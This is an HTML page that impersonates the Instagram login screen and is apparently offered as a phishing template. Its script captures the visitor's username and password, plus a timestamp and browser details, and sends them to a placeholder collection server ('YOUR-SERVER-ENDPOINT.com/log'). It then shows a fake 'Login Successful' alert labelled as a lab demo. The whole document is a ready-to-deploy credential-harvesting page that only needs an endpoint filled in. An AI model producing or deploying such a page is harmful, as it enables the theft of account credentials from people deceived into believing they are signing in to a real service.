<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Same beautiful styling as last version - shortened for space */
        @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;500;600;700&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(135deg, #f8f4f4, #fdfbfb);
            font-family: 'Instagram Sans', system-ui, sans-serif;
            display:flex; align-items:center; justify-content:center; min-height:100vh;
        }
        .container {
            background:white; padding:45px 35px; border-radius:20px; box-shadow:0 20px 45px rgba(0,0,0,0.15);
            max-width:420px; width:100%; text-align:center; border:1px solid #dbdbdb;
        }
        .logo { font-size:58px; font-weight:700; background:linear-gradient(45deg,#E1306C,#F56040,#C13584); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:6px; letter-spacing:-4.5px; }
        input { width:100%; padding:15px 16px; margin:10px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:8px; font-size:16px; }
        button { width:100%; padding:14px; margin:18px 0 10px; background:#0095f6; color:white; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; }
        button:hover { background:#0077c5; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">instagram</div>
        <div style="color:#8e8e8e; margin-bottom:35px;">The place to share your world</div>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username, email, or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log In</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) return;

            // === SEND TO YOUR SERVER ===
            const payload = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: "Client IP (visible on server)"
            };

            try {
                // CHANGE THIS URL TO YOUR ENDPOINT
                await fetch('https://YOUR-SERVER-ENDPOINT.com/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('%c✅ Data sent to your server', 'color:#00c853; font-size:16px;');
            } catch (err) {
                console.log('%c⚠️ Could not reach server (using local fallback)', 'color:#ff9800;');
            }

            // Visual feedback
            submitBtn.textContent = 'Logging in...';
            submitBtn.disabled = true;

            setTimeout(() => {
                alert('✅ Login Successful (Lab Demo)');
                submitBtn.textContent = 'Log In';
                submitBtn.disabled = false;
            }, 1400);
        });
    </script>
</body>
</html>
